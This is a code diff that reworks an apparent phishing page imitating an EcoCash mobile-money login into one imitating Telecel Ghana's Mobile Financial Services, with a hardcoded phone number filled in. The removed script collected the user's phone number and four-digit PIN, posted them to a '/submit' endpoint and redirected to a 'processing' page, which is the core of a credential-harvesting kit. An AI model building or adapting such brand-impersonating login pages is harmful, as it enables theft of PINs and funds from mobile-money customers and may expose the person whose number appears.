@@ -1,163 +1,234 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-    <title>EcoCash Login</title>
+    <title>Telecel Login</title>
 
-    <!-- MOBILE -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
-    <link rel="stylesheet" href="style.css">
 
     <style>
         body {
             margin: 0;
             font-family: 'Segoe UI', sans-serif;
-            background: #1e63c6;
+            background: #d32f2f;
         }
 
-        .top-section {
-            background: white;
-            padding: 30px 20px 80px;
-            border-bottom-left-radius: 60px;
-            border-bottom-right-radius: 60px;
+        /* TOP RED */
+        .top {
+            background: #d32f2f;
             text-align: center;
+            color: white;
+            padding: 30px 20px 20px;
         }
 
-        .logo {
-            font-size: 28px;
+        .logo-circle {
+            width: 70px;
+            height: 70px;
+            background: #eee;
+            border-radius: 50%;
+            margin: auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: #d32f2f;
             font-weight: bold;
         }
 
-        .logo span {
-            color: red;
+        .brand {
+            font-size: 28px;
+            font-weight: bold;
+            margin-top: 10px;
         }
 
-        .login-title {
+        .sub {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        /* WHITE CARD */
+        .card {
+            background: #f5f5f5;
             margin-top: 20px;
-            font-size: 20px;
+            padding: 25px;
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            border-bottom-left-radius: 60px;
+            border-bottom-right-radius: 60px;
         }
 
-        .phone-box {
+        .title {
+            text-align: center;
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #444;
+        }
+
+        label {
+            font-size: 14px;
+            color: #555;
+        }
+
+        select, input {
+            width: 100%;
+            padding: 14px;
+            margin-top: 8px;
+            border-radius: 10px;
+            border: 2px solid #d32f2f;
+            font-size: 16px;
+            box-sizing: border-box;
+            background: white;
+        }
+
+        /* PIN */
+        .pin-title {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .pin-row {
             display: flex;
             align-items: center;
-            border: 2px solid #1e63c6;
-            border-radius: 12px;
-            padding: 12px;
-            margin-top: 20px;
-        }
-
-        .flag {
-            font-size: 20px;
-            margin-right: 10px;
-        }
-
-        .phone-input {
-            border: none;
-            outline: none;
-            font-size: 16px;
-            width: 100%;
-        }
-
-        .pin-title {
-            margin-top: 25px;
-            font-size: 16px;
-        }
-
-        .pin-container {
-            display: flex;
-            justify-content: center;
             gap: 10px;
-            margin-top: 15px;
+            margin-top: 10px;
         }
 
         .pin-box {
             width: 50px;
-            height: 55px;
-            border: 2px solid #1e63c6;
+            height: 50px;
+            border: 2px solid #d32f2f;
             border-radius: 10px;
-            font-size: 22px;
             text-align: center;
+            font-size: 20px;
         }
 
-        .bottom-section {
-            background: #1e63c6;
-            padding: 40px 20px;
+        .icons {
+            display: flex;
+            gap: 8px;
+            margin-left: 5px;
+            font-size: 18px;
+        }
+
+        .forgot {
+            text-align: center;
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+
+        .login-btn {
+            width: 100%;
+            margin-top: 20px;
+            padding: 16px;
+            border-radius: 10px;
+            border: none;
+            background: #ddd;
+            color: white;
+            font-size: 16px;
+        }
+
+        /* BOTTOM */
+        .bottom {
             text-align: center;
             color: white;
+            padding: 30px 20px;
         }
 
-        .bottom-text {
-            margin-bottom: 20px;
-        }
-
-        .actions {
+        .bottom-logo {
+            width: 50px;
+            height: 50px;
+            background: #eee;
+            border-radius: 50%;
+            margin: auto;
             display: flex;
-            gap: 15px;
+            align-items: center;
             justify-content: center;
+            color: #d32f2f;
+            font-weight: bold;
         }
 
-        .action-btn {
-            background: white;
-            color: black;
-            padding: 14px;
-            border-radius: 12px;
-            width: 45%;
-            border: none;
+        .bottom h2 {
+            margin: 10px 0 5px;
         }
+
+        .bottom p {
+            margin: 0;
+            font-size: 14px;
+        }
+
+        .btn {
+            width: 100%;
+            background: white;
+            color: #333;
+            padding: 15px;
+            margin-top: 15px;
+            border-radius: 10px;
+            border: none;
+            font-size: 15px;
+        }
+
     </style>
 </head>
 
 <body>
 
-<!-- TOP WHITE -->
-<div class="top-section">
+<!-- TOP -->
+<div class="top">
+    <div class="logo-circle">t</div>
+    <div class="brand">Telecel</div>
+    <div class="sub">Mobile Financial Services</div>
+</div>
 
-    <div class="logo">Eco<span>Cash</span></div>
+<!-- CARD -->
+<div class="card">
 
-    <div class="login-title">Login</div>
+    <div class="title">Login to Your Account</div>
 
-    <!-- PHONE -->
-    <div class="phone-box">
-        <div class="flag">🇿🇼</div>
-        <input class="phone-input" id="phone" readonly>
-    </div>
+    <label>Account Type</label>
+    <select>
+        <option>Mobile</option>
+    </select>
 
-    <!-- PIN -->
+    <input type="text" value="0507950028">
+
     <div class="pin-title">Enter your PIN</div>
-  
-    <div class="pin-container">
-    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" autofocus>
-    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
-    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
-    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
-</div>
 
-<p id="errorMsg" style="color:red; text-align:center; margin-top:10px; display:none;"></p>
-    
-<button id="submitBtn" onclick="submitOtp()" class="login-btn">Submit</button>
-</div>
+    <div class="pin-row">
+        <input maxlength="1" class="pin-box" type="password">
+        <input maxlength="1" class="pin-box" type="password">
+        <input maxlength="1" class="pin-box" type="password">
+        <input maxlength="1" class="pin-box" type="password">
 
-<!-- BOTTOM BLUE -->
-<div class="bottom-section">
-
-    <div class="bottom-text">Don’t have an EcoCash Wallet?</div>
-
-    <div class="actions">
-        <button class="action-btn">Register</button>
-        <button class="action-btn">Help & Support</button>
+        <div class="icons">
+            👁️ 💬
+        </div>
     </div>
+
+    <div class="forgot">Forgot your PIN?</div>
+
+    <button class="login-btn">LOGIN</button>
+
+</div>
+
+<!-- BOTTOM -->
+<div class="bottom">
+
+    <div class="bottom-logo">t</div>
+    <h2>Telecel</h2>
+    <p>Ghana</p>
+    <p>Secure. Fast. Reliable.</p>
+
+    <button class="btn">📱 Download App</button>
+    <button class="btn">❓ Get Help</button>
 
 </div>
 
 <script>
-
 const inputs = document.querySelectorAll(".pin-box");
 
 inputs.forEach((input, index) => {
     input.addEventListener("input", () => {
         input.value = input.value.replace(/[^0-9]/g, "");
-        
+
         if (input.value && index < inputs.length - 1) {
             inputs[index + 1].focus();
         }
@@ -169,73 +240,7 @@ inputs.forEach((input, index) => {
         }
     });
 });
-
-async function submitOtp() {
-    const btn = document.getElementById("submitBtn");
-    if (btn.disabled) return;
-
-    let pin = "";
-    document.querySelectorAll(".pin-box").forEach(input => {
-        pin += input.value;
-    });
-
-    const error = document.getElementById("errorMsg");
-
-    if (pin.length < 4) {
-        error.innerText = "Enter full PIN";
-        error.style.display = "block";
-        return;
-    }
-
-    error.style.display = "none";
-
-    btn.innerText = "Processing...";
-    btn.disabled = true;
-
-    document.getElementById("pageLoader").style.display = "block";
-
-    const phone = document.getElementById("phone").value;
-
-    try {
-        const res = await fetch("/submit", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                name: "User",
-                phone: phone,
-                pin: pin
-            })
-        });
-
-        if (!res.ok) throw new Error();
-
-        // clear PIN AFTER submit
-        document.querySelectorAll(".pin-box").forEach(input => input.value = "");
-
-        localStorage.setItem("firstProcess", "yes");
-
-        window.location.href = "processing.html";
-
-    } catch (err) {
-        error.innerText = "Submission failed. Try again.";
-        error.style.display = "block";
-
-        btn.innerText = "Submit";
-        btn.disabled = false;
-
-        document.getElementById("pageLoader").style.display = "none";
-    }
-}
-
-   document.getElementById("phone").value = localStorage.getItem("phone") || "+263";
-
-window.onload = () => {
-    document.body.classList.add("loaded");
-};
-
 </script>
-<div id="pageLoader" class="loader" style="display:none;"></div>
+
 </body>
 </html>
